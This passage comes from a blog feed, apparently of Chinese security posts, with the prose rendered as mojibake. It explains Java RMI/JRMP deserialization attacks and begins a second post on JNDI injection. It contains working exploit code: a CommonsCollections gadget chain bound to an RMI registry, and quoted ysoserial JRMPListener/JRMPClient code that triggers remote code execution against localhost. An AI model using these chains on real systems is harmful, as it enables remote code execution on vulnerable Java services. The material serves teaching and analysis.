<span class="operator">=</span> LazyMap.decorate(innerMap,transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(ouputMap,<span class="string">&quot;pwn&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">tmpMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            tmpMap.put(<span class="string">&quot;pwn&quot;</span>,badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = <span class="literal">null</span>;</span><br><span class="line">            ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Override.class,tmpMap);</span><br><span class="line"></span><br><span class="line">            <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(App3.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">            registry.bind(<span class="string">&quot;pwn&quot;</span>,remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>ç†Ÿæ‚‰ysoserialçš„å°ä¼™ä¼´ä¼šå‘ç°ï¼Œè¿™å…¶å®å°±æ˜¯ä¸€ä¸ªysoserialä¸­çš„ä¸€ä¸ªpayloadï¼Œè€Œå½“æˆ‘å¯åŠ¨è¿™ä¸ªç¨‹åºï¼Œå¹¶æŠŠè¿™ä¸ªpayloadå¯¹è±¡åŠ¨æ€ä»£ç†æˆRemoteï¼Œå¹¶æ³¨å†Œåˆ°Registryæ³¨å†Œä¸­å¿ƒåï¼Œæ³¨å†Œä¸­å¿ƒå°±ä¼šè¢«RCEå¼¹å‡ºè®¡ç®—å™¨ã€‚</p>
<p>ä¸ºä»€ä¹ˆä¼šå¯¼è‡´è¿™æ ·å‘¢ï¼Ÿå…¶å®æˆ‘ä»¬ä¸éš¾çŒœæµ‹ï¼Œæ—¢ç„¶è§¦å‘äº†RCEï¼Œé‚£ä¹ˆå¿…ç„¶Registryæ³¨å†Œä¸­å¿ƒæ‰§è¡Œäº†è¿™æ®µä»£ç ï¼Œè€Œè¿™æ®µä»£ç æ€ä¹ˆä»ç¨‹åºBåˆ°ç¨‹åºAçš„å‘¢ï¼Œè¿™å…¶ä¸­å¿…ç„¶æ˜¯registry.bind(â€œpwnâ€,remote)è¿™ä¸ªæ–¹æ³•ä¸­çš„ç»†èŠ‚ï¼Œè€Œjavaå¯¹äºå¯¹è±¡æ•°æ®çš„ä¼ è¾“ï¼Œä¸€å‘éƒ½æ˜¯é€šè¿‡javaåŸç”Ÿåºåˆ—åŒ–çš„æ–¹å¼è¿›è¡Œã€‚</p>
<h2 id="2-3-ä¸ºä»€ä¹ˆä½¿ç”¨JRMPèƒ½äº’ç›¸å¯¹æ‰“"><a href="#2-3-ä¸ºä»€ä¹ˆä½¿ç”¨JRMPèƒ½äº’ç›¸å¯¹æ‰“" class="headerlink" title="2.3 ä¸ºä»€ä¹ˆä½¿ç”¨JRMPèƒ½äº’ç›¸å¯¹æ‰“"></a>2.3 ä¸ºä»€ä¹ˆä½¿ç”¨JRMPèƒ½äº’ç›¸å¯¹æ‰“</h2><p>åœ¨è¯´ä½¿ç”¨JRMPä¸ºä»€ä¹ˆèƒ½äº’ç›¸å¯¹æ‰“å‰ï¼Œæˆ‘ä»¬å›é¡¾ä¸€ä¸‹å‰é¢ç¬¬ä¸€ç« å†™çš„JRMPçš„æ¦‚å¿µâ€œJRMPæ˜¯ä¸€ä¸ªåè®®ï¼Œæ˜¯ç”¨äºJava RMIè¿‡ç¨‹ä¸­çš„åè®®ï¼Œåªæœ‰ä½¿ç”¨è¿™ä¸ªåè®®ï¼Œæ–¹æ³•è°ƒç”¨åŒæ–¹æ‰èƒ½æ­£å¸¸çš„è¿›è¡Œæ•°æ®äº¤æµã€‚â€ï¼Œå¾ˆæ˜æ˜¾JRMPæ˜¯ä¸€ç§åè®®ï¼Œå®ƒè§„å®šäº†æ•°æ®æ˜¯ä»¥ä»€ä¹ˆæ ¼å¼ã€ä»€ä¹ˆå½¢å¼åœ¨RMIçš„è¿‡ç¨‹è¿›è¡Œä¼ è¾“ã€‚é‚£å°±ä¸éš¾ç†è§£ä¸ºä»€ä¹ˆä½¿ç”¨JRMPèƒ½äº’ç›¸å¯¹æ‰“äº†ã€‚</p>
<p>å¦‚æœè¯´ï¼ŒJRMPåè®®è§„å®šäº†RMIçš„æ—¶å€™ï¼Œä¼ è¾“çš„æ•°æ®åŒ…å«æœ‰javaåŸç”Ÿåºåˆ—åŒ–æ•°æ®ï¼Œå¹¶ä¸”åœ¨JRMPçš„å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡ç«¯ï¼Œå½“æ¥æ”¶åˆ°JRMPåè®®æ•°æ®æ—¶ï¼Œéƒ½ä¼šæŠŠåºåˆ—åŒ–çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–çš„è¯ï¼Œé‚£ä¹ˆå°±ä¸éš¾è§£æäº†ã€‚</p>
<p>é‚£æˆ‘ä»¬å†ä»¥ä¸€ä¸ªä¾‹å­ï¼Œæ¥è®²è¿°å¦‚ä½•ç”¨JRMPåè®®ä½¿ç”¨å®¢æˆ·ç«¯å»æ‰“æœåŠ¡ç«¯ï¼š</p>
<ul>
<li>æœåŠ¡ç«¯</li>
</ul>
<p>æˆ‘è¿™é‡Œä½¿ç”¨äº†ysoserialçš„payloadç›´æ¥åˆ›å»ºä¸€ä¸ªJRMPçš„æœåŠ¡ç«¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PayloadTest( skip = &quot;This test would make you potentially vulnerable&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPListener</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;UnicastRemoteObject&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> UnicastRemoteObject <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">jrmpPort</span> <span class="operator">=</span> Integer.parseInt(command);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">uro</span> <span class="operator">=</span> Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            RemoteRef.class</span><br><span class="line">        &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(jrmpPort)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Reflections.getField(UnicastRemoteObject.class, <span class="string">&quot;port&quot;</span>).set(uro, jrmpPort);</span><br><span class="line">        <span class="keyword">return</span> uro;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PayloadRunner.runDeserialize = <span class="literal">true</span>;</span><br><span class="line">        PayloadRunner.run(JRMPListener.class, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;8889&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<ul>
<li>å®¢æˆ·ç«¯</li>
</ul>
<p>æ¥ç€çœ‹ysoserialçš„exploitç›®å½•ysoserial&#x2F;src&#x2F;main&#x2F;java&#x2F;ysoserial&#x2F;exploit</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exploit</span><br><span class="line">â”œâ”€JBoss.java</span><br><span class="line">â”œâ”€JMXInvokeMBean.java</span><br><span class="line">â”œâ”€JRMPClassLoadingListener.java</span><br><span class="line">â”œâ”€JRMPClient.java</span><br><span class="line">â”œâ”€JRMPListener.java</span><br><span class="line">â”œâ”€JSF.java</span><br><span class="line">â”œâ”€JenkinsCLI.java</span><br><span class="line">â”œâ”€JenkinsListener.java</span><br><span class="line">â”œâ”€JenkinsReverse.java</span><br><span class="line">â”œâ”€RMIRegistryExploit.java</span><br><span class="line">â””RMIRegistryExploit2.java</span><br></pre></td></tr></table></figure>


<p>å…¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨JRMPClient.javaè¿™ä¸ªexploitå»å®ç°æ‰“æœåŠ¡ç«¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] argsx )</span> &#123;</span><br><span class="line">        String[] args = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;8889&quot;</span>,<span class="string">&quot;CommonsCollections6&quot;</span>,<span class="string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">if</span> ( args.length &lt; <span class="number">4</span> ) &#123;</span><br><span class="line">            System.err.println(JRMPClient.class.getName() + <span class="string">&quot; &lt;host&gt; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> Utils.makePayloadObject(args[<span class="number">2</span>], args[<span class="number">3</span>]);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hostname</span> <span class="operator">=</span> args[ <span class="number">0</span> ];</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(args[ <span class="number">1</span> ]);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.err.println(String.format(<span class="string">&quot;* Opening JRMP socket %s:%d&quot;</span>, hostname, port));</span><br><span class="line">            makeDGCCall(hostname, port, payloadObject);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">        Utils.releasePayload(args[<span class="number">2</span>], payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>æˆ‘ä»¬æŒ‡å®šäº†å½“é€šè¿‡å®¢æˆ·ç«¯ä½¿ç”¨JRMPåè®®å»è¿æ¥æœåŠ¡ç«¯æ—¶ï¼Œä½¿ç”¨CommonsCollections6è¿™ä¸ªpayloadï¼ˆååºåˆ—åŒ–gadget chainï¼‰ï¼Œå»RCEã€‚</p>
<p>PSï¼šåœ¨jdku121å¼€å§‹ï¼Œéƒ¨åˆ†classä¼šè¢«è¿‡æ»¤ï¼Œå¯¼è‡´å¤§éƒ¨åˆ†payloadä¸èƒ½è¢«ååºåˆ—åŒ–ï¼ŒæŠ¥é”™ï¼š</p>
<p>å…·ä½“æ€ä¹ˆç»•è¿‡ï¼Œç½‘ä¸Šçœ‹ç€æŒºå¤šæ–‡ç« åˆ†æçš„ã€‚</p>
<p>æ¥ç€æˆ‘ä»¬å†ä»¥ä¸€ä¸ªä¾‹å­ï¼Œæ¥è®²è¿°å¦‚ä½•ç”¨JRMPåè®®ä½¿ç”¨æœåŠ¡ç«¯å»æ‰“å®¢æˆ·ç«¯ï¼š</p>
<ul>
<li>æœåŠ¡ç«¯</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exploit</span><br><span class="line">â”œâ”€JBoss.java</span><br><span class="line">â”œâ”€JMXInvokeMBean.java</span><br><span class="line">â”œâ”€JRMPClassLoadingListener.java</span><br><span class="line">â”œâ”€JRMPClient.java</span><br><span class="line">â”œâ”€JRMPListener.java</span><br><span class="line">â”œâ”€JSF.java</span><br><span class="line">â”œâ”€JenkinsCLI.java</span><br><span class="line">â”œâ”€JenkinsListener.java</span><br><span class="line">â”œâ”€JenkinsReverse.java</span><br><span class="line">â”œâ”€RMIRegistryExploit.java</span><br><span class="line">â””RMIRegistryExploit2.java</span><br></pre></td></tr></table></figure>


<p>æˆ‘ä»¬è¿™é‡Œçš„ä¾‹å­ï¼Œä½¿ç”¨çš„æ˜¯ysoserialçš„JRMPListener.javaï¼Œå¹¶ç›‘å¬9999ç«¯å£çš„JRMPè¿æ¥ï¼Œå½“æœ‰å®¢æˆ·ç«¯è¿ä¸Šåï¼Œä¼šä»¥JRMPçš„åè®®æ ¼å¼ï¼ŒæŠŠCommonsCollections6çš„payloadå‘ç»™å¯¹æ–¹ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] args )</span> &#123;</span><br><span class="line">    args = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;9999&quot;</span>, <span class="string">&quot;CommonsCollections6&quot;</span>, <span class="string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> ( args.length &lt; <span class="number">3</span> ) &#123;</span><br><span class="line">        System.err.println(JRMPListener.class.getName() + <span class="string">&quot; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;</span>);</span><br><span class="line">        System.exit(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> Utils.makePayloadObject(args[ <span class="number">1</span> ], args[ <span class="number">2</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(args[ <span class="number">0</span> ]);</span><br><span class="line">        System.err.println(<span class="string">&quot;* Opening JRMP listener on &quot;</span> + port);</span><br><span class="line">        <span class="type">JRMPListener</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRMPListener</span>(port, payloadObject);</span><br><span class="line">        c.run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Listener error&quot;</span>);</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">    Utils.releasePayload(args[<span class="number">1</span>], payloadObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<ul>
<li>å®¢æˆ·ç«¯</li>
</ul>
<p>æˆ‘è¿™é‡Œä½¿ç”¨äº†ysoserialçš„payloadç›´æ¥åˆ›å»ºä¸€ä¸ªJRMPçš„å®¢æˆ·ç«¯ï¼Œè¿æ¥127.0.0.1çš„9999ç«¯å£</p>
<p>ysoserial.payloads.JRMPClientï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] args )</span> &#123;</span><br><span class="line">    args = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;9999&quot;</span>, <span class="string">&quot;CommonsCollections6&quot;</span>, <span class="string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> ( args.length &lt; <span class="number">3</span> ) &#123;</span><br><span class="line">        System.err.println(JRMPListener.class.getName() + <span class="string">&quot; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;</span>);</span><br><span class="line">        System.exit(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> Utils.makePayloadObject(args[ <span class="number">1</span> ], args[ <span class="number">2</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(args[ <span class="number">0</span> ]);</span><br><span class="line">        System.err.println(<span class="string">&quot;* Opening JRMP listener on &quot;</span> + port);</span><br><span class="line">        <span class="type">JRMPListener</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRMPListener</span>(port, payloadObject);</span><br><span class="line">        c.run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Listener error&quot;</span>);</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">    Utils.releasePayload(args[<span class="number">1</span>], payloadObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>ç„¶åï¼Œå°±èƒ½çœ‹çš„è®¡ç®—å™¨å¼¹å‡ºæ¥äº†ï¼Œé¡ºåˆ©RCEã€‚</p>
<h1 id="3-æ‰“æ³•æ€»ç»“"><a href="#3-æ‰“æ³•æ€»ç»“" class="headerlink" title="3 æ‰“æ³•æ€»ç»“"></a>3 æ‰“æ³•æ€»ç»“</h1><h2 id="æ‰“Registryæ³¨å†Œä¸­å¿ƒ"><a href="#æ‰“Registryæ³¨å†Œä¸­å¿ƒ" class="headerlink" title="æ‰“Registryæ³¨å†Œä¸­å¿ƒ"></a>æ‰“Registryæ³¨å†Œä¸­å¿ƒ</h2><p>é€šè¿‡ä½¿ç”¨Registryè¿æ¥åˆ°æ³¨å†Œä¸­å¿ƒï¼Œç„¶åæŠŠgadget chainå¯¹è±¡bindæ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒï¼Œä»è€Œå¼•èµ·æ³¨å†Œä¸­å¿ƒååºåˆ—åŒ–RCE</p>
<h2 id="æ‰“InitialContext-lookupæ‰§è¡Œè€…"><a href="#æ‰“InitialContext-lookupæ‰§è¡Œè€…" class="headerlink" title="æ‰“InitialContext.lookupæ‰§è¡Œè€…"></a>æ‰“InitialContext.lookupæ‰§è¡Œè€…</h2><p>é€šè¿‡ä½¿ç”¨JNDIçš„å®ç°ï¼Œä¹Ÿå°±æ˜¯rmiæˆ–ldapçš„ç›®å½•ç³»ç»ŸæœåŠ¡ï¼Œåœ¨å…¶ä¸­æ”¾ç½®ä¸€ä¸ªæŸåç§°å…³è”çš„Referenceï¼ŒReferenceå…³è”httpæœåŠ¡ä¸­çš„æ¶æ„classï¼Œåœ¨æŸç¨‹åºInitialContext.lookupç›®å½•ç³»ç»ŸæœåŠ¡åï¼Œè¿”å›Referenceç»™è¯¥ç¨‹åºï¼Œä½¿å…¶åŠ è½½è¿œç¨‹classï¼Œä»è€ŒRCE</p>
<h2 id="JRMPåè®®å®¢æˆ·ç«¯æ‰“æœåŠ¡ç«¯"><a href="#JRMPåè®®å®¢æˆ·ç«¯æ‰“æœåŠ¡ç«¯" class="headerlink" title="JRMPåè®®å®¢æˆ·ç«¯æ‰“æœåŠ¡ç«¯"></a>JRMPåè®®å®¢æˆ·ç«¯æ‰“æœåŠ¡ç«¯</h2><p>ä½¿ç”¨JRMPåè®®ï¼Œç›´æ¥å‘é€gadget chainçš„åºåˆ—åŒ–æ•°æ®åˆ°æœåŠ¡ç«¯ï¼Œä»è€Œå¼•èµ·æœåŠ¡ç«¯ååºåˆ—åŒ–RCE</p>
<h2 id="JRMPåè®®æœåŠ¡ç«¯æ‰“å®¢æˆ·ç«¯"><a href="#JRMPåè®®æœåŠ¡ç«¯æ‰“å®¢æˆ·ç«¯" class="headerlink" title="JRMPåè®®æœåŠ¡ç«¯æ‰“å®¢æˆ·ç«¯"></a>JRMPåè®®æœåŠ¡ç«¯æ‰“å®¢æˆ·ç«¯</h2><p>ä½¿ç”¨JRMPåè®®ï¼Œå½“å®¢æˆ·ç«¯è¿ä¸Šåï¼Œç›´æ¥è¿”å›gadget chainçš„åºåˆ—åŒ–æ•°æ®ç»™å®¢æˆ·ç«¯ï¼Œä»è€Œå¼•èµ·å®¢æˆ·ç«¯ååºåˆ—åŒ–RCE</p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…æJNDIæ³¨å…¥</title>
    <url>/JNID%E6%B3%A8%E5%85%A5/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒäº†å‡ ä¸ªå¸ˆå‚…çš„æ–‡ç« ï¼Œå†™äº†ç¯‡åˆ†æã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown79711298_p0.png"></p>
<span id="more"></span>

<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>JNDI(<code>Java Naming and Directory Interface</code>,Javaå‘½åå’Œç›®å½•æ¥å£)æ˜¯SUNå…¬å¸æä¾›çš„ä¸€ç§æ ‡å‡†çš„Javaå‘½åç³»ç»Ÿæ¥å£ï¼ŒJNDIæä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯APIï¼Œé€šè¿‡ä¸åŒçš„è®¿é—®æä¾›è€…æ¥å£JNDIæœåŠ¡ä¾›åº”æ¥å£(SPI)çš„å®ç°ï¼Œç”±ç®¡ç†è€…å°†JNDI APIæ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•ç³»ç»Ÿï¼Œä½¿å¾—Javaåº”ç”¨ç¨‹åºå¯ä»¥å’Œè¿™äº›å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ä¹‹é—´è¿›è¡Œäº¤äº’ã€‚ç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„ä¸€ç§è‡ªç„¶æ‰©å±•ã€‚</p>
<p>JNDI(<code>Java Naming and Directory Interface</code>)æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè®¾è®¡çš„APIï¼Œä¸ºå¼€å‘äººå‘˜æä¾›äº†æŸ¥æ‰¾å’Œè®¿é—®å„ç§å‘½åå’Œç›®å½•æœåŠ¡çš„é€šç”¨ã€ç»Ÿä¸€çš„æ¥å£ï¼Œç±»ä¼¼JDBCéƒ½æ˜¯æ„å»ºåœ¨æŠ½è±¡å±‚ä¸Šã€‚ç°åœ¨JNDIå·²ç»æˆä¸ºJ2EEçš„æ ‡å‡†ä¹‹ä¸€ï¼Œæ‰€æœ‰çš„J2EEå®¹å™¨éƒ½å¿…é¡»æä¾›ä¸€ä¸ªJNDIçš„æœåŠ¡ã€‚</p>
<p>JNDIå¯è®¿é—®çš„ç°æœ‰çš„ç›®å½•åŠæœåŠ¡æœ‰ï¼š<br>DNSã€XNam ã€Novellç›®å½•æœåŠ¡ã€LDAP(Lightweight Directory Access Protocolè½»å‹ç›®å½•è®¿é—®åè®®)ã€ CORBAå¯¹è±¡æœåŠ¡ã€æ–‡ä»¶ç³»ç»Ÿã€Windows XP&#x2F;2000&#x2F;NT&#x2F;Me&#x2F;9xçš„æ³¨å†Œè¡¨ã€RMIã€DSML v1&amp;v2ã€NISã€‚</p>
<p>ä»¥ä¸Šæ˜¯ä¸€æ®µç™¾åº¦wikiçš„æè¿°ã€‚ç®€å•ç‚¹æ¥è¯´å°±ç›¸å½“äºä¸€ä¸ªç´¢å¼•åº“ï¼Œä¸€ä¸ªå‘½åæœåŠ¡å°†å¯¹è±¡å’Œåç§°è”ç³»åœ¨äº†ä¸€èµ·ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡å®ƒä»¬æŒ‡å®šçš„åç§°æ‰¾åˆ°ç›¸åº”çš„å¯¹è±¡ã€‚ä»ç½‘ä¸Šæ–‡ç« é‡Œé¢æŸ¥è¯¢åˆ°è¯¥ä½œç”¨æ˜¯å¯ä»¥å®ç°åŠ¨æ€åŠ è½½æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œä»è€Œä¿æŒæ•°æ®åº“ä»£ç ä¸å˜åŠ¨ç­‰ã€‚</p>
<h2 id="JNIDç»“æ„"><a href="#JNIDç»“æ„" class="headerlink" title="JNIDç»“æ„"></a>JNIDç»“æ„</h2><p>åœ¨Java JDKé‡Œé¢æä¾›äº†5ä¸ªåŒ…ï¼Œæä¾›ç»™JNDIçš„åŠŸèƒ½å®ç°ï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">javax.namingï¼šä¸»è¦ç”¨äºå‘½åæ“ä½œï¼Œå®ƒåŒ…å«äº†å‘½åæœåŠ¡çš„ç±»å’Œæ¥å£ï¼Œè¯¥åŒ…å®šä¹‰äº†Contextæ¥å£å’ŒInitialContextç±»ï¼›</span><br><span class="line"></span><br><span class="line">javax.naming.directoryï¼šä¸»è¦ç”¨äºç›®å½•æ“ä½œï¼Œå®ƒå®šä¹‰äº†DirContextæ¥å£å’ŒInitialDir- Contextç±»ï¼›</span><br><span class="line"></span><br><span class="line">javax.naming.eventï¼šåœ¨å‘½åç›®å½•æœåŠ¡å™¨ä¸­è¯·æ±‚äº‹ä»¶é€šçŸ¥ï¼›</span><br><span class="line"></span><br><span class="line">javax.naming.ldapï¼šæä¾›LDAPæ”¯æŒï¼›</span><br><span class="line"></span><br><span class="line">javax.naming.spiï¼šå…è®¸åŠ¨æ€æ’å…¥ä¸åŒå®ç°ï¼Œä¸ºä¸åŒå‘½åç›®å½•æœåŠ¡ä¾›åº”å•†çš„å¼€å‘äººå‘˜æä¾›å¼€å‘å’Œå®ç°çš„é€”å¾„ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºé€šè¿‡JNDIå¯ä»¥è®¿é—®ç›¸å…³æœåŠ¡ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="å‘½åæœåŠ¡"><a href="#å‘½åæœåŠ¡" class="headerlink" title="å‘½åæœåŠ¡"></a>å‘½åæœåŠ¡</h2><p>å‘½åæœåŠ¡æ˜¯ä¸€ç§ç®€å•çš„é”®å€¼å¯¹ç»‘å®šï¼Œå¯ä»¥é€šè¿‡é”®åæ£€ç´¢å€¼ï¼ŒRMIå°±æ˜¯å…¸å‹çš„å‘½åæœåŠ¡</p>
